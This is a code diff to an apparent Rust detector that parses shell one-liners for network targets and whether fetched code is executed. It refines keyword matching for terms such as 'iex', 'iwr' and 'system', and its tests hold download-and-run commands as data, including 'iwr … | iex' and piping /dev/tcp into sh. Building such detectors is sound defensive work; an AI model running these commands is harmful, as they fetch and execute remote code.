@@ -1578,10 +1578,26 @@ impl Reader<'_> {
             return;
         };
         let (start, end) = (first.start, last.end);
-        let code = self.text[start..end].to_ascii_lowercase();
+        let mut code = self.text[start..end].to_ascii_lowercase();
+        // A URL is the target, not code: `…/system` says nothing.
+        for (from, to, _) in urls_in(&self.text[start..end]) {
+            code[from..to].fill(b' ');
+        }
+        let word_byte = |b: &u8| b.is_ascii_alphanumeric() || *b == b'_';
+        // These start a name, and `system` and `iex` also end one:
+        // `confirm x` is not `irm `, `fopen(` is not `open(`. The others
+        // are found inside `-MLWP::Simple` and `urllib2` as well.
         let says = |list: &[&str]| {
-            list.iter()
-                .any(|word| code.windows(word.len()).any(|w| w == word.as_bytes()))
+            list.iter().any(|word| {
+                let word = word.as_bytes();
+                let whole_start = matches!(word, b"system" | b"iex" | b"open(" | b"irm " | b"iwr ");
+                let whole_end = matches!(word, b"system" | b"iex");
+                code.windows(word.len()).enumerate().any(|(at, w)| {
+                    w == word
+                        && !(whole_start && at > 0 && word_byte(&code[at - 1]))
+                        && !(whole_end && code.get(at + word.len()).is_some_and(word_byte))
+                })
+            })
         };
         if !says(fetches) {
             return;
@@ -2321,6 +2337,17 @@ mod tests {
         assert_eq!(targets(py), []);
         let pl = "perl -MLWP::Simple -e 'getstore(\"http://example.org/x\",\"/tmp/y\")'";
         assert_eq!(targets(pl), one("http://example.org/x", true));
+        // Words are whole: `confirm` is not `irm `, and a URL is no code.
+        let pl = "perl -MLWP::Simple -e 'get(\"http://example.org/system\")'";
+        assert_eq!(targets(pl), one("http://example.org/system", false));
+        let pl = "perl -MLWP::Simple -e 'get(\"http://example.org/x\"); $confirm = 1; fopen(2)'";
+        assert_eq!(targets(pl), one("http://example.org/x", false));
+        let pl = "perl -MLWP::Simple -e 'get(\"http://example.org/x\"); system(1)'";
+        assert_eq!(targets(pl), one("http://example.org/x", true));
+        let ps = "powershell -c \"iwr http://example.org/x; confirm x\"";
+        assert_eq!(targets(ps), one("http://example.org/x", false));
+        let ps = "powershell -c \"iwr http://example.org/x | iex\"";
+        assert_eq!(targets(ps), one("http://example.org/x", true));
         assert_eq!(
             targets("cat </dev/tcp/203.0.113.9/80 | sh"),
             one("203.0.113.9", true)
